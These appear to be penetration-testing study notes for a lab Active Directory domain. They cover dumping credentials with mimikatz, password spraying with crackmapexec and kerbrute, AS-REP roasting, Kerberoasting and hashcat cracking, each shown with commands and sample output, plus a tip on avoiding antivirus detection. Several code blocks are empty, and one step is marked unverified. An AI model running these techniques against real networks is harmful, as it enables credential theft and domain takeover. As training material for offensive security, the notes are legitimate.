
# AD Auth
See [AD Authentication](Active%20Directory.md#Authentication) for in-depth explanation of NTLM and Kerberos auth processes.


#### Scenario
- We've got elevated local admin privs on CLIENT75 as `jeff`

**192.168.x.70** - DC1
**192.168.x.72** - web04
**192.168.x.75** - client75

##### Hash dump
- Elevate privs
```powershell
whoami /groups
	GROUP INFORMATION
	-----------------
	...
	Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 


Start-Process powershell.exe -Verb runas


whoami /groups
	GROUP INFORMATION
	-----------------
	...
	Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

- Start mimikatz
> Due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz.

```powershell
cd C:\Tools

.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

- Dump creds of all logged-in users
```powershell
# mimikatz #
privilege::debug
	Privilege '20' OK

sekurlsa::logonpasswords
	Authentication Id : 0 ; 7578418 (00000000:0073a332)
	Session           : Batch from 0
	User Name         : dave
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/3/2024 11:51:28 AM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1103
	        msv :
	         [00000003] Primary
	         * Username : dave
	         * Domain   : CORP
	         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494             #<-- NOTE
	         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd     #<-- NOTE
	         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
	...
	Authentication Id : 0 ; 6858012 (00000000:0068a51c)
Session           : RemoteInteractive from 2                           #<-- NOTE
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 8/3/2024 11:43:06 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea                 #<-- NOTE
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f         #<-- NOTE
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
	...
```
	- Should dump all hashes for all logged in users including those RDP'd in (see `jeff`)

Hashes shown will vary based on AD implementation
- Only NTLM is available for AD instances at a functional level of Windows 2003
- NTLM and SHA-1 may be available for instances running Windows Server 2008 or later
- WDigest is enabled for older operating systems like Windows 7, or operating systems that have it manually set
	- When enabled, mimikatz will display cleartext alongside the hash


##### Abusing TGT & Service Tickets
- Create and cache a service ticket by listing the contents of the SMB share on web04
```powershell
dir \\web04.corp.com\backup
	    Directory: \\web04.corp.com\backup
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

- Use mimikatz to view the ticket stored in memory
```powershell
# mimikatz #
sekurlsa::tickets
	Authentication Id : 0 ; 6857791 (00000000:0068a43f)
	Session           : RemoteInteractive from 2
	User Name         : jeff
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/3/2024 11:43:06 AM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1105
	
	         * Username : jeff
	         * Domain   : CORP.COM
	         * Password : (null)
	
	        Group 0 - Ticket Granting Service                                                                            #<-- NOTE
	         [00000000]
	           Start/End/MaxRenew: 8/3/2024 12:07:44 PM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
	           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM
	           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             322c28d6c359900cb7005cdb41aedbfa1859bbae6edfaf59a56fe567b910ac3d
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
	         [00000001]
	           Start/End/MaxRenew: 8/3/2024 11:43:06 AM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
	           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
	           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             fe1e7b604e288fb57e84dbea8ca6d03408f8119c5409a7e48edc56f4bf8167a5
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
	
	        Group 1 - Client Ticket ?
	
	        Group 2 - Ticket Granting Ticket                                                                             #<-- NOTE
	         [00000000]
	           Start/End/MaxRenew: 8/3/2024 11:43:06 AM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
	           Target Name  (02) : krbtgt ; corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM ( corp.com )
	           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             5a7372545540bf0f0087ff02181492f0635cef46e6f2b78c61488918a95991a0
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```
	- Output shows both TGS & TGT
		- TGS allows access to only particular resources associated with those tickets
		- TGT allows us to request a TGS for specific resources we want to target within the domain



# AD PW Attacks

Before attempting brute forcing or wordlist auth attacks, it's important to consider account lockout.
Too many attempts might yield a lockout or alert sysadmins of presence
- Always best to get hash and crack offline


- View account lockout policy
```powershell
net accounts
	Force user logoff how long after time expires?:       Never
	Minimum password age (days):                          1
	Maximum password age (days):                          42
	Minimum password length:                              7
	Length of password history maintained:                24
	Lockout threshold:                                    5
	Lockout duration (minutes):                           30
	Lockout observation window (minutes):                 30
	Computer role:                                        WORKSTATION
	The command completed successfully.
```
	- Lockout Threshold - Indicates 5 attempts before being locked out
		- Can safely attempt 4 before risking a lock out.
	- Lockout Observation Window - Indicates how long the lockout lasts.

With the above info, assuming a user doesn't fail a login, we can safely attempt 192 logins in a 24-hour period against every domain user without triggering a lockout

Most simple, but noisiest, password attack would be to compile a short list of most common passwords and spraying it against a massive amount of users.  But there are better ways:


## LDAP & ADSI Spray

Type of pw spraying attack which leverages the *DirectoryEntry* utilized in the [AD Enumeration LDAP](21%20-%20AD Enumeration.md#LDAP) section by making queries in the context of a different user.

While previously we performed queries against the domain controller as a logged-in user with DirectoryEntry, here we'll make queries in the context of a different user by setting the DirectoryEntry instance.

- Provide three arguments, including the LDAP path to the domain controller, the username, and the password to the *DirectoryEntry* constructor
```powershell
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = ($domainObj.PdcRoleOwner).Name

# Construct LDAP path to search 
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# Attempt
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

- If the uname and pw are correct, the object will be created show the following results:
```powershell
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

- If the uname and pw are incorrect, the object will not be created and an exception will be shown:
```powershell
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

### Spray-Passwords.ps1
PS Script which uses the above ^ abilities to enumerate all users and performs authentications according to the _Lockout threshold_ and _Lockout observation window_

```powershell
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
	WARNING: also targeting admin accounts.
	Performing brute force - press [q] to stop the process and print results...
	Guessed password for user: 'pete' = 'Nexus123!'
	Guessed password for user: 'jen' = 'Nexus123!'
	Users guessed are:
	 'pete' with password: 'Nexus123!'
	 'jen' with password: 'Nexus123!'
```
	- -Pass - Attempt with a single password
	- -Admin - Also test admin accounts.


## SMB AD Spray
- One of the traditional approaches to pw spraying in AD envs.
- Some drawbacks
	- For every attempt, a full SMB conn has to be set up and terminated.
		- Very noisy
	- Quite slow

### crackmapexec
- Has multiple protocols with which to attack from
- Will show if user has admin privs on the target
- Doesn't examine the password policy of the domain before spraying
	- Be careful about account lockout


- Using a user list of `dave`, `jen`, `pete`, attempt to find valid creds
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\pete:Nexus123!


crackmapexec smb 192.168.217.75 -u dave -p 'Flowers1' -d corp.com
	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)



crackmapexec smb 192.168.217.70-76 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
	SMB         192.168.217.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)
	SMB         192.168.217.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.73  445    FILES04          [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.70  445    DC1              [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.72  445    WEB04            [+] corp.com\pete:Nexus123!
```
	- --continue-on-success - Avoid stopping at the first valid cred
	- `+` or `-` Indicates validity of creds
	- (Pwn3d!) - Indicates they have admin privs on the target


## TGT

### kinit
- Use on Linux
- Can obtain & cache a Kerberos TGT
- Need to provide a uname & pw
	- If creds are valid, will obtain TGT
- Advantage:
	- Only uses 2 UDP frames to determine validity
		- Sends only AS-REQ & examines response.
- Can use Bash to automate


### kerbrute
- Cross platform

- Using same unames in a .txt file as earlier (ANSI encoded), spray the domain
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt "Nexus123!"
	    __             __               __
	   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
	
	Version: v1.0.3 (9dad6e1) - 08/10/24 - Ronnie Flathers @ropnop
	
	2024/08/10 19:10:52 >  Using KDC(s):
	2024/08/10 19:10:52 >   dc1.corp.com:88
	2024/08/10 19:10:52 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
	2024/08/10 19:10:52 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
	2024/08/10 19:10:52 >  Done! Tested 3 logins (2 successes) in 0.051 seconds
```


# AS-REP Roasting

As mentioned, when requesting auth:

AS-REQ is sent and an AS-REP containing the session key and TGT is sent back by the DC if the creds are valid.
- aka `Kerberos preauthorization`
- Prevents offline password guessing
- w/o, attacker could send an AS-REQ to DC on behalf of any user.

After obtaining the AS-REP from the DC, however, an attacker could perform an offline attack against the encrypted part of the response.
- aka `AS-REP Roasting`

> AD user account option is set to _Do not require Kerberos preauthentication_ - disabled by default
	- Kerberos preauth is performed for all users
	- Possible to enable this account option manually
	- May be enabled as some apps and techs require it to function normally


## impacket-GetNPUsers
- Linux


```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete




```
	- -dc-ip - IP address of the domain controller
	- -request - Request a TGT
	- -outputfile - Name of the file the AS-REP hash will be stored (hashcat format)
	- corp.com/pete - Auth target in **domain/user** format
		- This is the user we use for authenticating

Above shows that _dave_ has the user account option _Do not require Kerberos preauthentication_ enabled, meaning it's vulnerable to AS-REP Roasting

- Check correct mode for hashcat
```bash
hashcat --help | grep -i "Kerberos"
	  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
	  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
	  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
	  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
	  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
	  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
	   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
	  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
	  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol     #<-- This one
```

- Offline crack AS-REP hash
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force







```

>To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use _impacket-GetNPUsers_ as shown without the **-request** and **-outputfile** options.


## Rubeus
- Windows
- Toolset for raw Kerberos interactions and abuses.


- Automatically id vuln user accounts
```powershell
.\Rubeus.exe asreproast /nowrap








```
	- When used while logged in as a pre-authed domain user, we don't need to add in any options other than `asreproast`
	- /nowrap - Prevent new lines being added to the AS-REP hash results


Again, shows that *dave* is the vuln user.
As w/ Linux, offline crack w/ hashcat
```bash
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


>To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired**
```powershell
Get-User -PreautNotRequired


# LDAP query
(&(&(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))))
```


### _Targeted AS-REP Roasting_

Assuming we do not find any users w/ the *Do not require...* account option enabled, if we have control of an account w/ _GenericWrite_ or _GenericAll_ perms,
	we can leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication

```powershell
Get-ADUSer -Filter 'DoesNotRequirePreAuth - eq $false' | Set-ADAccountControl -doesnotrequirepreauth $true
```

> Should always reset UAC value once hash is obtained.


>>>>>>>>>>>>>> Double check & verify ^^^^^^^^



# Kerberoasting

**Kerberos Protocol**
- When a user wants to access a resource hosted by a Service Principal Name (SPN)
	- Client requests a service ticket that is generated by the domain controller.
	- Service ticket is then decrypted and validated by the application server.


>When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
>These checks are performed as a second step only when connecting to the service itself.
>This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.


The service ticket is encrypted via the password hash of the SPN
- If we can request the ticket and decrypt it w/ brute force/ guessing, we can use it to crack the cleartext pw of the service account


- Specify `kerberoast` command with [**Rubeus**](Tools.md#Rubeus)
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast






```
	- /outfile - File to store TGS-Rep results
	- Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user

ID'd one user account vulnerable to Kerberoasting and wrote the hash to an output file.

- Search for correct hashcat mode.
```bash
hashcat --help | grep -i "Kerberos"
	  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
	  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
	  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
	  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
	  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
	  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
	   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
	  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol     #<-- This one
	  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

- Crack
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force







```
